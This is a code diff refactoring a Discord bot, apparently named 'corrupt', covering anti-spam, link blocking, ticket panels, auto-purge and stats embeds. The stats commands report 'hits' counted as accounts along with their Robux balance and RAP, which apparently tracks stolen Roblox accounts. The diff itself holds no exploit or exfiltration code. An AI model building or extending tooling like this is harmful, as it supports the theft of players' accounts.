@@ -46,7 +46,6 @@ function formatNumber(num) { return num ? num.toLocaleString() : "0"; }
 function getRandomPurge() { return PURGE_BANNERS[Math.floor(Math.random() * PURGE_BANNERS.length)]; }
 function getRandomFuck() { return FUCK_GIFS[Math.floor(Math.random() * FUCK_GIFS.length)]; }
 
-// ================= FETCH FIX =================
 async function fetchWithTimeout(url, timeout = 20000) {
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), timeout);
@@ -54,19 +53,9 @@ async function fetchWithTimeout(url, timeout = 20000) {
   try {
     const res = await fetch(url, {
       signal: controller.signal,
-      headers: {
-        "User-Agent": "Mozilla/5.0 (DiscordBot; corrupt)",
-        "Accept": "application/json",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive"
-      }
+      headers: { "User-Agent": "DiscordBot (corrupt)" } // fix API
     });
-
-    if (!res.ok) {
-      const text = await res.text().catch(() => "");
-      throw new Error(`HTTP ${res.status} | ${text}`);
-    }
-
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
     return res;
   } finally {
     clearTimeout(id);
@@ -78,17 +67,17 @@ console.log("Trying to login Discord bot...");
 client.login(TOKEN).then(() => console.log(`Logged in as ${client.user.tag}`));
 
 // ================= ANTI-SPAM / LINK / INJURIES =================
-const userMessageMap = new Map(); 
+const userMessageMap = new Map();
 
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
   const member = message.member;
   const botAvatar = client.user.displayAvatarURL({ dynamic: true });
 
-  // ================= SPAM =================
+  // SPAM
   const userData = userMessageMap.get(message.author.id) || { count: 0, timer: null };
   userData.count += 1;
-  if (!userData.timer) { userData.timer = setTimeout(() => userMessageMap.delete(message.author.id), 10000); }
+  if (!userData.timer) userData.timer = setTimeout(() => userMessageMap.delete(message.author.id), 10000);
   userMessageMap.set(message.author.id, userData);
 
   if (userData.count > 10) {
@@ -102,26 +91,18 @@ client.on("messageCreate", async (message) => {
     return;
   }
 
-  // ================= LINK =================
+  // LINK
   if (/(https?:\/\/[^\s]+)/g.test(message.content)) {
     await message.delete().catch(() => null);
-    const embed = new EmbedBuilder()
-      .setColor(0x000000)
-      .setTitle("You cannot send links here!")
-      .setDescription("Links are not allowed on this server.")
-      .setThumbnail(botAvatar);
+    const embed = new EmbedBuilder().setColor(0x000000).setTitle("You cannot send links here!").setDescription("Links are not allowed on this server.").setThumbnail(botAvatar);
     await message.author.send({ embeds: [embed] }).catch(() => null);
     return;
   }
 
-  // ================= INJURIES =================
+  // INJURIES
   if (/injuries/i.test(message.content)) {
     await member.timeout(10 * 60 * 1000, "Sent 'injuries'").catch(() => null);
-    const embed = new EmbedBuilder()
-      .setColor(0x000000)
-      .setTitle("You are timed out!")
-      .setDescription("Stop sending 'injuries'.")
-      .setThumbnail(botAvatar);
+    const embed = new EmbedBuilder().setColor(0x000000).setTitle("You are timed out!").setDescription("Stop sending 'injuries'.").setThumbnail(botAvatar);
     await message.author.send({ embeds: [embed] }).catch(() => null);
     return;
   }
@@ -141,19 +122,8 @@ client.on("messageCreate", async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embedTop = new EmbedBuilder().setColor(0x000000).setImage(BANNER_TOP);
-      const embed = new EmbedBuilder()
-        .setColor(0x000000)
-        .setTitle(`— <a:emoji_20:1464222092353605735> NORMAL STATS —`)
-        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
-        .setDescription(
-          `**USER:** \`${userName}\`\n\n` +
-          `<a:heart:1463322847546966087> **TOTAL STATS**\n` +
-          `\`\`\`Hits:     ${formatNumber(normal.Totals?.Accounts)}\nVisits:   ${formatNumber(normal.Totals?.Visits)}\nClicks:   ${formatNumber(normal.Totals?.Clicks)}\`\`\`\n\n` +
-          `<a:corrupt_card:1463245786421661718> **BIGGEST HITS**\n` +
-          `\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\`\n\n` +
-          `<a:emoji_17:1463657710246691008> **TOTAL HIT STATS**\n` +
-          `\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\``
-        )
+      const embed = new EmbedBuilder().setColor(0x000000).setTitle(`— <a:emoji_20:1464222092353605735> NORMAL STATS —`).setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
+        .setDescription(`**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL STATS**\n\`\`\`Hits:     ${formatNumber(normal.Totals?.Accounts)}\nVisits:   ${formatNumber(normal.Totals?.Visits)}\nClicks:   ${formatNumber(normal.Totals?.Clicks)}\`\`\`\n\n<a:corrupt_card:1463245786421661718> **BIGGEST HITS**\n\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\`\n\n<a:emoji_17:1463657710246691008> **TOTAL HIT STATS**\n\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\``)
         .setImage(getRandomPurge())
         .setFooter({ text: `corrupt • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
 
@@ -177,14 +147,8 @@ client.on("messageCreate", async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embedTop = new EmbedBuilder().setColor(0x000000).setImage(BANNER_TOP);
-      const embedDaily = new EmbedBuilder()
-        .setColor(0x000000)
-        .setTitle(`— <a:emoji_20:1464222092353605735> DAILY STATS —`)
-        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
-        .setDescription(
-          `**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL DAILY STATS**\n` +
-          `\`\`\`Hits:     ${formatNumber(daily.Totals?.Accounts)}\nVisits:   ${formatNumber(daily.Totals?.Visits)}\nClicks:   ${formatNumber(daily.Totals?.Clicks)}\`\`\``
-        )
+      const embedDaily = new EmbedBuilder().setColor(0x000000).setTitle(`— <a:emoji_20:1464222092353605735> DAILY STATS —`).setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
+        .setDescription(`**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL DAILY STATS**\n\`\`\`Hits:     ${formatNumber(daily.Totals?.Accounts)}\nVisits:   ${formatNumber(daily.Totals?.Visits)}\nClicks:   ${formatNumber(daily.Totals?.Clicks)}\`\`\``)
         .setImage(getRandomPurge())
         .setFooter({ text: `corrupt • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
 
@@ -232,16 +196,11 @@ client.on("messageCreate", async (message) => {
   // ================= !create_ticket_panel =================
   if (message.content.startsWith("!create_ticket_panel") && message.author.id === OWNER_ID) {
     const panelEmbeds = [
-      {
-        "color": 0x000000,
-        "image": { "url": "https://i.imgur.com/lx1ZH9Q.gif" }
-      },
-      {
-        "title": "— <a:emoji_20:1464222092353605735> ᴄᴏʀʀᴜᴘᴛ ʜᴇʟᴘ —",
-        "description": "<a:emoji_17:1463657710246691008> ʜᴇʟʟᴏ!  ᴡᴇ ᴀʀᴇ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ.\n\n<a:emoji_18:1463658185901608991> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ ᴜsɪɴɢ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ.\n\n<a:corrupt_card:1463245786421661718> ᴏᴜʀ ᴛᴇᴀᴍ ᴡɪʟʟ ʀᴇsᴘᴏɴᴅ ᴀs sᴏᴏɴ ᴀs ᴘᴏssɪʙʟᴇ ᴡɪᴛʜ ᴀssɪsᴛᴀɴᴄᴇ.",
-        "color": 0x000000,
-        "image": { "url": "https://i.imgur.com/3i5dler.gif" }
-      }
+      { color: 0x000000, image: { url: BANNER_TOP } },
+      { title: "— <a:emoji_20:1464222092353605735> ᴄᴏʀʀᴜᴘᴛ ʜᴇʟᴘ —",
+        description: "<a:emoji_17:1463657710246691008> ʜᴇʟʟᴏ!  ᴡᴇ ᴀʀᴇ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ.\n\n<a:emoji_18:1463658185901608991> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ ᴜsɪɴɢ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ.\n\n<a:corrupt_card:1463245786421661718> ᴏᴜʀ ᴛᴇᴀᴍ ᴡɪʟʟ ʀᴇsᴘᴏɴᴅ ᴀs sᴏᴏɴ ᴀs ᴘᴏssɪʙʟᴇ ᴡɪᴛʜ ᴀssɪsᴛᴀɴᴄᴇ.",
+        color: 0x000000,
+        image: { url: "https://i.imgur.com/3i5dler.gif" } }
     ];
 
     const selectMenu = new ActionRowBuilder().addComponents(
@@ -284,14 +243,9 @@ client.on("interactionCreate", async (interaction) => {
     await interaction.reply({ content: `Your ticket has been created: ${ticketChannel}`, ephemeral: true });
 
     const ticketEmbeds = [
-      {
-        "color": 0x000000,
-        "image": { "url": "https://i.imgur.com/lx1ZH9Q.gif" }
-      },
-      {
-        "title": "— <a:emoji_20:1464222092353605735> ᴛɪᴄᴋᴇᴛ —",
-        "description": "ᴡᴇʟʟᴄᴏᴍᴇ!\n\n<a:emoji_17:1463657710246691008> ᴘʟᴇᴀsᴇ ᴅᴇsᴄʀɪʙᴇ ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ.\n\n<a:emoji_18:1463658185901608991> ᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴛᴇᴀᴍ ᴡɪʟʟ ᴀssɪsᴛ ʏᴏᴜ ᴀs sᴏᴏɴ ᴀs ᴘᴏssɪʙʟᴇ.\n\n<a:emoji_19:1463658201525387297> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ."
-      }
+      { color: 0x000000, image: { url: BANNER_TOP } },
+      { title: "— <a:emoji_20:1464222092353605735> ᴛɪᴄᴋᴇᴛ —",
+        description: "ᴡᴇʟʟᴄᴏᴍᴇ!\n\n<a:emoji_17:1463657710246691008> ᴘʟᴇᴀsᴇ ᴅᴇsᴄʀɪʙᴇ ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ.\n\n<a:emoji_18:1463658185901608991> ᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴛᴇᴀᴍ ᴡɪʟʟ ᴀssɪsᴛ ʏᴏᴜ ᴀs sᴏᴏɴ ᴀs ᴘᴏssɪʙʟᴇ.\n\n<a:emoji_19:1463658201525387297> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ." }
     ];
 
     const closeButton = new ActionRowBuilder().addComponents(
@@ -319,7 +273,8 @@ setInterval(async () => {
 
         const deleted = await channel.bulkDelete(fetched, true).catch(() => null);
         if (deleted && deleted.size > 0) {
-          console.log(`Auto-purge: Deleted ${deleted.size} messages in ${channel.name} (${          console.log(`Auto-purge: Deleted ${deleted.size} messages in ${channel.name} (${guild.name})`);
+          // FIX LINIE DE CONSOLE.LOG
+          console.log(`Auto-purge: Deleted ${deleted.size} messages in ${channel.name} (${guild.name})`);
         }
       }
     });
